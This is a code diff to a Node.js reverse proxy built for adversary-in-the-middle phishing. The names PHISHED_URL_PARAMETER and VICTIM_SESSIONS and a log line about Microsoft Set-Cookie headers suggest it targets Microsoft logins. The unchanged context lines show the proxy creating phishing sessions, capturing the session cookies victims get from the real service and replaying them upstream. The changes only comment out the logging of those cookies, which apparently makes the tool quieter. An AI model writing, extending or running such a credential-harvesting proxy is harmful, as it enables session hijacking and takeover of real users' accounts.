@@ -93,11 +93,11 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
     // ---- LOG INCOMING COOKIE HEADER ----
     console.log(`[REQUEST] ${method} ${url}`);
-    if (headers.cookie) {
-        console.log(`[INCOMING COOKIE] ${headers.cookie}`);
-    } else {
-        console.log('[INCOMING COOKIE] (none)');
-    }
+    // if (headers.cookie) {
+//     console.log(`[INCOMING COOKIE] ${headers.cookie}`);
+// } else {
+//     console.log('[INCOMING COOKIE] (none)');
+// }
 
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
@@ -108,7 +108,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
                 const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
                 clientResponse.setHeader("Set-Cookie", cookieHeader);
-                console.log(`[SET SESSION COOKIE] ${cookieHeader}`);
+             //   console.log(`[SET SESSION COOKIE] ${cookieHeader}`);
                 session = cookieName;
             }
             VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
@@ -168,7 +168,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                         const { cookieName, cookieValue } = generateNewSession(phishedURL);
                                         const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
                                         clientResponse.setHeader("Set-Cookie", cookieHeader);
-                                        console.log(`[SET SESSION COOKIE (anonymous)] ${cookieHeader}`);
+                                       // console.log(`[SET SESSION COOKIE (anonymous)] ${cookieHeader}`);
 
                                         VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                         VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
@@ -432,7 +432,7 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
 
         const proxyResponseCookie = proxyResponse.headers["set-cookie"];
         if (proxyResponseCookie) {
-            console.log(`[MICROSOFT SET-COOKIE] ${JSON.stringify(proxyResponseCookie)}`);
+          //  console.log(`[MICROSOFT SET-COOKIE] ${JSON.stringify(proxyResponseCookie)}`);
             updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
         }
 
@@ -931,7 +931,7 @@ function updateCurrentSessionCookies(request, newCookies, proxyHostname, current
     }
 
     // ---- LOG SESSION COOKIES AFTER UPDATE ----
-    console.log(`[SESSION STATE] ${JSON.stringify(VICTIM_SESSIONS[currentSession].cookies.map(c => ({ name: c.name, value: c.value, domain: c.domain, path: c.path, expires: c.expires })))}`);
+    //console.log(`[SESSION STATE] ${JSON.stringify(VICTIM_SESSIONS[currentSession].cookies.map(c => ({ name: c.name, value: c.value, domain: c.domain, path: c.path, expires: c.expires })))}`);
 }
 
 function getValidDomains(domains) {
@@ -989,11 +989,11 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
     const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
     if (Object.keys(proxyRequestCookies).length) {
         proxyRequestOptions.headers.cookie = proxyRequestCookies;
-        console.log(`[PROXY REQUEST COOKIE] ${proxyRequestCookies}`);
+     //   console.log(`[PROXY REQUEST COOKIE] ${proxyRequestCookies}`);
     }
     else {
         delete proxyRequestOptions.headers.cookie;
-        console.log(`[PROXY REQUEST COOKIE] (none)`);
+      //  console.log(`[PROXY REQUEST COOKIE] (none)`);
     }
 
     if (proxyRequestOptions.headers.origin) {
